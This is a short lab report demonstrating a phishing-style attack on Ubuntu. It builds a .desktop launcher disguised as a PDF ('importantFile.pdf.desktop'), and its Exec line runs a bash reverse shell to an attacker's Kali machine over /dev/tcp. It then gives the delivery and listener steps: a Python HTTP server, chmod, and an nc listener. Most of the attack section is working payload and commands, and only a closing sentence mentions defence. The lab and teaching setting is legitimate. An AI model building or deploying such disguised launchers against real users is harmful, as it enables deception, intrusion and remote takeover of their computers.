# Reverse Shell via .desktop File  
*Cybersecurity Demo Report*

---

## 1. Objective

This demo showcases a phishing-style reverse shell attack using a disguised `.desktop` file on Ubuntu.  
When the victim double-clicks the file, it initiates a reverse shell back to the attacker's Kali machine without opening a terminal or requiring further interaction.

---

## 2. Environment Setup

- **Attacker:** Kali Linux  
- **Victim:** Ubuntu Desktop VM  
- **Listener Tool:** Netcat (nc)  
- **Network:** Bridged Adapter with IP `192.168.1.114` (Kali)  

---

## 3. Tools Used

- Netcat for listening on the attacker’s side  
- Bash reverse shell payload embedded in a `.desktop` file  
- Python HTTP server for file delivery  
- `curl` for file download  

---

## 4. Attack Scenario

A `.desktop` file named `importantFile.pdf.desktop` was created with a malicious `Exec` command that opens a reverse shell to the attacker's machine.  
When the file is made executable and allowed for launching in Ubuntu, double-clicking it initiates a shell session back to the attacker.

---
## Execution Steps

1. **Create the Payload File (`importantFile.pdf.desktop`)**

Create a `.desktop` file with the following content. This file, when executed, will open a reverse shell back to your Kali machine:

    [Desktop Entry]
    Name=importantFile.pdf
    Exec=bash -i >& /dev/tcp/192.168.1.114/4443 0>&1
    Type=Application
    Terminal=false

Save this content as `importantFile.pdf.desktop`.

---

2. **Start a Simple HTTP Server on the Host Machine (Ubuntu)**

Run the following command to serve the file over HTTP on port 8888:

    python3 -m http.server 8888

---

3. **Download the Payload File on the Target (Ubuntu)**

Download the file using the URL below on the target machine:

    http://192.168.1.114:8888/importantFile.pdf.desktop

---

4. **Set Execution Permissions and Move to Desktop**

Make the file executable:

    chmod +x importantFile.pdf.desktop

Move it to the Desktop folder:

    mv importantFile.pdf.desktop ~/Desktop/

---

5. **Start a Netcat Listener on Kali**

Open a terminal on Kali and run:

    nc -lvnp 4443

---

6. **Execute the Payload**

On the Ubuntu target, double-click the `importantFile.pdf.desktop` file on the Desktop to trigger the reverse shell connection to your Kali listener.


## Sources Used

- Linux man pages (`chmod`, `bash`, `netcat`)
- Python official documentation: [`python3 -m http.server`](https://docs.python.org/3/library/http.server.html)
- Desktop Entry Specification: [freedesktop.org](https://specifications.freedesktop.org/desktop-entry-spec/latest/)
- Netcat usage tutorials and common penetration testing guides
- Personal practical experience and lab testing

---

## Conclusion

This procedure demonstrates a straightforward way to create a malicious `.desktop` file that establishes a reverse shell connection from an Ubuntu target back to an attacker’s Kali machine. By hosting the payload on a simple Python HTTP server and using basic Linux commands to download, set permissions, and execute the file, the attacker can gain remote shell access.

The use of `.desktop` files as executable launchers on Linux desktops highlights the importance of cautious handling of downloaded files and maintaining strict user privilege controls. Additionally, setting up a netcat listener effectively allows the attacker to receive the connection.

Understanding these steps helps both penetration testers and system administrators recognize potential attack vectors and implement appropriate defenses.
